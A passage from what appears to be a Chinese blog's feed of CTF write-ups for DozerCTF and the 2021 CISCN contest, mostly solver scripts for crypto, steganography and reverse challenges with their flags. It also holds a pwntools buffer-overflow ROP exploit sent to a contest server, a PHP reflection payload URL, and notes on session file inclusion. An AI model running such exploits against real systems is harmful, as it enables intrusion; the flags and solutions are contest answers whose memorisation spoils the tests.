class="line">05060706132027</span><br></pre></td></tr></table></figure><p>②.中国剩余定理</p><p>百度找个脚本跑下得到key为5007</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 求两个数的最大公约数gcd函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">return</span> gcd(b,a % b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断一个列表任意两个数是否两两互质</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compare</span>(<span class="params"><span class="built_in">list</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">            <span class="keyword">if</span> gcd(<span class="built_in">list</span>[i],<span class="built_in">list</span>[j]) != <span class="number">1</span>:</span><br><span class="line">                print(<span class="string">&#x27;不能直接使用中国剩余定理！&#x27;</span>)</span><br><span class="line">                exit()</span><br><span class="line"><span class="comment">#如果满足条件，就会继续执行，否则退出程序</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求出输入的m1,m2,..,mk 的乘积m</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">product_m</span>(<span class="params"><span class="built_in">list</span></span>):</span></span><br><span class="line">    m = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        m *= i</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求M1,M2,..,MK 的值 Mj = m / mj 并返回一个名为shang的列表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_divsion</span>(<span class="params"><span class="built_in">list</span>,m</span>):</span></span><br><span class="line">    div = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        div.append(m // i)</span><br><span class="line">    <span class="keyword">return</span> div</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_inverse</span>(<span class="params">a, m</span>):</span>  <span class="comment"># 求一个数a 的逆  再模m 的值  这个函数返回的是一个值不是列表</span></span><br><span class="line">    <span class="keyword">if</span> gcd(a, m) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    u1, u2, u3 = <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    v1, v2, v3 = <span class="number">0</span>, <span class="number">1</span>, m</span><br><span class="line">    <span class="keyword">while</span> v3 != <span class="number">0</span>:</span><br><span class="line">        q = u3 // v3</span><br><span class="line">        v1, v2, v3, u1, u2, u3 = (u1 - q * v1), (u2 - q * v2), (u3 - q * v3), v1, v2, v3</span><br><span class="line">    <span class="keyword">return</span> u1 % m</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求Xj   算法为：Xj = (M * M_INVERSE * a) % mj</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_x</span>(<span class="params">M:<span class="built_in">int</span> ,M_inverse:<span class="built_in">int</span> ,a :<span class="built_in">int</span>,m:<span class="built_in">int</span></span>):</span></span><br><span class="line">    product_x = (M * M_inverse * a) % m</span><br><span class="line">    <span class="keyword">return</span> product_x</span><br><span class="line"></span><br><span class="line"><span class="comment"># 算出最终答案X = X1+X2+...Xk</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_solution</span>(<span class="params">list_m, list_a</span>):</span></span><br><span class="line">                                                        <span class="comment"># compare(list_m)</span></span><br><span class="line">    m = product_m(list_m)</span><br><span class="line"></span><br><span class="line">    list_M = get_divsion(list_m, m)</span><br><span class="line"></span><br><span class="line">    list_M_inverse = []</span><br><span class="line">    list_X = []</span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(list_M)):</span><br><span class="line">        list_M_inverse.append(get_inverse(list_M[i], list_m[i]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(list_M)):</span><br><span class="line">        list_X.append(get_x(list_M[i],list_M_inverse[i],list_a[i],m))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> list_X:</span><br><span class="line">        total += x</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> total % m</span><br><span class="line"></span><br><span class="line"><span class="comment"># #测试数据</span></span><br><span class="line"><span class="comment"># list_a = [2,3,2]</span></span><br><span class="line"><span class="comment"># list_m = [3,5,7]</span></span><br><span class="line">list_a = [<span class="number">2</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">16</span>]</span><br><span class="line">list_m = [<span class="number">5</span>,<span class="number">7</span>,<span class="number">17</span>,<span class="number">23</span>]</span><br><span class="line">print(get_solution(list_m, list_a))</span><br></pre></td></tr></table></figure><p>③.base85解码</p><p><img src="https://i.loli.net/2021/05/29/mWAV1wG5Crbcfnj.png"></p><p>最终整理得到flag：DozerCTF{DOYOUKNOW_CRT5007_good_over}</p><h2 id="funny-pixel"><a href="#funny-pixel" class="headerlink" title="funny_pixel"></a>funny_pixel</h2><p>对比两张一样的图片找到不同的像素点，然后将每张图片的0和1提取出来8位一组转字符，得到flag：DozerCTF{D0_yOU_LIke_PixEl}</p><p>附上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">219</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&#x27;./funny_pixel/&#x27;</span>+<span class="built_in">str</span>(a)+<span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line">    x, y = img.size</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(y):</span><br><span class="line">            p = img.getpixel((i,j))</span><br><span class="line">            <span class="keyword">if</span> p ==(<span class="number">239</span>, <span class="number">239</span>, <span class="number">39</span>):</span><br><span class="line">                t+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> t==<span class="number">10</span>:</span><br><span class="line">        res+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">tmp=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)//<span class="number">8</span>):</span><br><span class="line">tmp.append(res[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(i,<span class="number">2</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="PwnPwnPwn"><a href="#PwnPwnPwn" class="headerlink" title="PwnPwnPwn"></a>PwnPwnPwn</h2><p>调用gets函数直接向string写入/bin/sh，得到flag：Dozerctf{pwn_is_so_good_i_love_pwn}</p><p><img src="https://i.loli.net/2021/05/30/obXMryfBxDkiutW.png"></p><p>附上exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&quot;1.14.160.21&quot;</span>,<span class="string">&quot;20001&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x78</span>+p64(<span class="number">0x401313</span>)+p64(<span class="number">0x404060</span>)+p64(<span class="number">0x401080</span>)+p64(<span class="number">0x401176</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="i-wanna-大晚上特供版"><a href="#i-wanna-大晚上特供版" class="headerlink" title="i wanna 大晚上特供版"></a>i wanna 大晚上特供版</h2><p>gm8decompiler解包得到<code>.gmk</code>文件在gamemake中打开，最终在背景图中找到flag：Dozerctf{i_wanna_To_be_THE_gay}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\gm8decompiler.exe &quot;I Wanna Be The Guy Remake 8.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/30/FU31aVvwsJBkQuo.png"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="简单域渗透Ⅱ-1"><a href="#简单域渗透Ⅱ-1" class="headerlink" title="简单域渗透Ⅱ-1"></a>简单域渗透Ⅱ-1</h2><p>根据提示账号密码为dozer/dozer123进入后台，发现有日志，翻了翻找到了文件名成功坐上大佬的车</p><p><img src="https://i.loli.net/2021/05/30/WfgBUHoAE7aP4iK.png"></p><p>于是乎直接读flag得到flag：Dozerctf{k94jf8ejdbzks2l4o40rjdnfewrkyosd}</p><p><img src="https://i.loli.net/2021/05/30/N7x5BGktsX6J4Ei.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DozerCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第14届全国大学生信息安全竞赛-创新实践能力赛</title>
      <link href="2021/05/16/2021CISCN/"/>
      <url>2021/05/16/2021CISCN/</url>
      
        <content type="html"><![CDATA[<blockquote><p>CTF高考好耶！</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210516190309.jpg"></p></blockquote><h1 id="第一卷-Web"><a href="#第一卷-Web" class="headerlink" title="第一卷-Web"></a>第一卷-Web</h1><h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>来源于：<a href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p><p>php反射，使用ReflectionMethod内置类的getDocComment方法 , 然后爆破一下rb的值得知函数名q，进而得到flag：CISCN{1yVxf-Nt5Gc-ITZhp-6rqwI-2sE6S-}</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;114.116.229.178:25042&#x2F;?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;q&amp;rd&#x3D;getDocComment</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210516150651068.png"></p><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>报错注入 + 无列名注入</p><p>卷不动了~</p><h1 id="第一卷-Misc"><a href="#第一卷-Misc" class="headerlink" title="第一卷-Misc"></a>第一卷-Misc</h1><h2 id="tiny-traffic"><a href="#tiny-traffic" class="headerlink" title="tiny_traffic"></a>tiny_traffic</h2><p>首先在流量包中提取出test与secret两个br文件</p><p>接着我们找到脚本解码得到对应的proto3文件test1、secret1</p><p>附上<a href="https://pan.baidu.com/s/1acusuaH05vnw4Mczjj1qSQ"><strong>下载地址</strong></a>（提取码：ddql）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python brotlipython.py test test1</span><br><span class="line">python brotlipython.py secret secret1</span><br></pre></td></tr></table></figure><p>最后在用protoc解密，整理得到flag：CISCN{e66a22e23457889b0fb1146d172a38dc}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protoc --decode&#x3D;PBResponse test1 &lt; secret1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210516192658597.png"></p><p>附上安装protoc命令（Linux-kali）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PROTOC_ZIP&#x3D;protoc-3.14.0-linux-x86_64.zip</span><br><span class="line">curl -OL https:&#x2F;&#x2F;github.com&#x2F;protocolbuffers&#x2F;protobuf&#x2F;releases&#x2F;download&#x2F;v3.14.0&#x2F;$PROTOC_ZIP</span><br><span class="line">sudo unzip -o $PROTOC_ZIP -d &#x2F;usr&#x2F;local bin&#x2F;protoc</span><br><span class="line">sudo unzip -o $PROTOC_ZIP -d &#x2F;usr&#x2F;local &#39;include&#x2F;*&#39;</span><br><span class="line">rm -f $PROTOC_ZIP</span><br></pre></td></tr></table></figure><h2 id="running-pixel"><a href="#running-pixel" class="headerlink" title="running_pixel"></a>running_pixel</h2><p>首先分解gif（得分解为png或者bmp的，要是jpg最后整出来可能会导致像素信息损失）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert running_pixel.gif .&#x2F;out&#x2F;out.png</span><br></pre></td></tr></table></figure><p>接着把每一帧的rgb是233 233 233的像素放到一张图上，跑下脚本得到画好的382张图</p><p>关键就在于通过对比每十帧里的相同的图片，进而找到（233，233，233）这个点</p><p>最后解出来了出题人还要恶心你一下，一帧一帧按顺序去看就能得到flag：CISCN{12504d0f-9de1-4b00-87a5-a5fdd0986a00}（PS：382张图，字还特小）</p><center>放个flag的gif演示图</center><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021ciscngifflag.gif"></p><p>附上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">IMG = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">400</span>,<span class="number">400</span>), (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">382</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&#x27;./out/out-&#x27;</span>+<span class="built_in">str</span>(m)+<span class="string">&#x27;.png&#x27;</span>).convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">    t = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):</span><br><span class="line">            p1 = img.getpixel((i,j))</span><br><span class="line">            <span class="keyword">if</span> p1==(<span class="number">233</span>,<span class="number">233</span>,<span class="number">233</span>):</span><br><span class="line">                IMG.putpixel((j,i),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">    IMG.save(<span class="string">&#x27;./gif/&#x27;</span>+<span class="built_in">str</span>(m)+<span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line">print(<span class="built_in">len</span>(res))</span><br><span class="line">plt.imshow(IMG)</span><br><span class="line">plt.show()</span><br><span class="line">IMG.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="第一卷-Reverse"><a href="#第一卷-Reverse" class="headerlink" title="第一卷-Reverse"></a>第一卷-Reverse</h1><h2 id="glass"><a href="#glass" class="headerlink" title="glass"></a>glass</h2><p>反编译发现在so层加密，解包打开IDA，分析函数得知是rc4加密，跑下脚本得到flag：CISCN{6654d84617f627c88846c172e0f4d46c}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210516145155448879.jpg"></p><p>附上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">res = [<span class="number">0xA3</span>, <span class="number">0x1A</span>, <span class="number">0xE3</span>, <span class="number">0x69</span>, <span class="number">0x2F</span>, <span class="number">0xBB</span>, <span class="number">0x1A</span>, <span class="number">0x84</span>, <span class="number">0x65</span>, <span class="number">0xC2</span>, <span class="number">0xAD</span>, <span class="number">0xAD</span>, <span class="number">0x9E</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x1F</span>, <span class="number">0x8E</span>, <span class="number">0x36</span>, <span class="number">0x4F</span>, <span class="number">0xE1</span>, <span class="number">0xEB</span>, <span class="number">0xAF</span>, <span class="number">0xF0</span>, <span class="number">0xEA</span>, <span class="number">0xC4</span>, <span class="number">0xA8</span>, <span class="number">0x2D</span>, <span class="number">0x42</span>, <span class="number">0xC7</span>, <span class="number">0x6E</span>, <span class="number">0x3F</span>, <span class="number">0xB0</span>, <span class="number">0xD3</span>, <span class="number">0xCC</span>, <span class="number">0x78</span>, <span class="number">0xF9</span>, <span class="number">0x98</span>, <span class="number">0x3F</span>]</span><br><span class="line">key = <span class="string">b&quot;12345678&quot;</span></span><br><span class="line">rc4 = ARC4.new(key)</span><br><span class="line">key = <span class="built_in">list</span>(key)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">    res[i] ^= key[i % <span class="number">8</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">39</span>, <span class="number">3</span>):</span><br><span class="line">    tmp0 = res[i]</span><br><span class="line">    tmp1 = res[i+<span class="number">1</span>]</span><br><span class="line">    tmp2 = res[i+<span class="number">2</span>]</span><br><span class="line">    res[i] = tmp1 ^ tmp2</span><br><span class="line">    res[i+<span class="number">2</span>] = tmp0 ^ res[i]</span><br><span class="line">    res[i+<span class="number">1</span>] = res[i+<span class="number">2</span>] ^ tmp2</span><br><span class="line">print(rc4.decrypt(<span class="built_in">bytes</span>(res)))</span><br></pre></td></tr></table></figure><h1 id="第二卷-Web"><a href="#第二卷-Web" class="headerlink" title="第二卷-Web"></a>第二卷-Web</h1><h2 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h2><p>session文件包含</p><p>扫描web文件得到了.listing，.listing文件内容有个php文件you_can_seeeeeeee_me.php</p><p>访问you_can_seeeeeeee_me.php是个phpinfo()，有开PHP_SESSION_UPLOAD_PROGRESS，并且拿到了session的路径: /var/lib/php/sessions/jehaahfcad/</p><p>这样我们可以通过上传文件，然后使用文件包含执行这个/var/lib/php/sessions/jehaahfcad/sess_xxxxxxxxxx文件</p><p>phpinfo有ban了函数 , 不能执行命令，所以用scandir去读取目录</p><h1 id="第二卷-Misc"><a href="#第二卷-Misc" class="headerlink" title="第二卷-Misc"></a>第二卷-Misc</h1><h2 id="隔空传话"><a href="#隔空传话" class="headerlink" title="隔空传话"></a>隔空传话</h2><p>首先我们拿到了一堆加密的通话数据，得知是短信编码中的<a href="http://www.sendsms.cn/pdu/"><strong>PDU</strong></a>（但是给的数据过多，懒狗肯定想办法整个批量的</p><p>附上批量脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;data.txt&#x27;</span>)</span><br><span class="line">url = <span class="string">&#x27;https://www.smspdu.be/&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;ppdu&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdu&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;Decode&#x27;</span>&#125;</span><br><span class="line">rep = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;TD&gt;(.*?)&lt;/TD&gt;&#x27;</span>)</span><br><span class="line">ff = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">rr = f.readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(rr)):</span><br><span class="line">    c = rr[i]</span><br><span class="line">    data[<span class="string">&#x27;pdu&#x27;</span>] = c.strip()</span><br><span class="line">    r = requests.post(url,data).text</span><br><span class="line">    res = re.findall(rep,<span class="built_in">str</span>(r))</span><br><span class="line">    print(c)</span><br><span class="line">    print(res[<span class="number">20</span>])</span><br><span class="line">    ff.write(res[<span class="number">20</span>]+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure><p>接着根据pdu信息里本身包含的时间信息排序，排起来就是一张png（指的是后面的16进制数据</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202105161497675.png"></p><p>附上排序脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;data.txt&#x27;</span>).readlines()</span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>).readlines()</span><br><span class="line">res = &#123;&#125;</span><br><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="built_in">len</span>(f)):</span><br><span class="line">    l = f[i][<span class="number">42</span>:<span class="number">44</span>][::-<span class="number">1</span>]+f[i][<span class="number">44</span>:<span class="number">46</span>][::-<span class="number">1</span>]</span><br><span class="line">    res[<span class="built_in">int</span>(l)] = f1[i-<span class="number">4</span>].strip()</span><br><span class="line">    print(l)</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&#x27;final.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3924</span>,<span class="number">4938</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f2.write(res[i])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>最后crc爆破宽度会发现前面解码给的w465意思就是宽度是465，进而整理得到flag：CISCN{15030442_b586_4c9e_b436_26def12293e4}（手动滑稽~</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021051614564975461.png"></p><h1 id="第三卷-Misc"><a href="#第三卷-Misc" class="headerlink" title="第三卷-Misc"></a>第三卷-Misc</h1><h2 id="robot"><a href="#robot" class="headerlink" title="robot"></a>robot</h2><p>把TCP的第一个流导出来，然后所有的坐标都在里面，提取一下就能得到flag：CISCN{easy_robo_xx}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021051641220212136.png"></p><p>附上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;tmp&#x27;</span>).read()</span><br><span class="line">reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;tgPos.*?]&#x27;</span>)</span><br><span class="line">res = re.findall(reg,f)</span><br><span class="line">print(res)</span><br><span class="line">print(<span class="built_in">len</span>(res))</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">500</span>,<span class="number">500</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res[:-<span class="number">1</span>]:</span><br><span class="line">    tmp = <span class="built_in">eval</span>(i.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">2</span>])</span><br><span class="line">    img.putpixel((tmp[<span class="number">0</span>],tmp[<span class="number">1</span>]),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">img.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
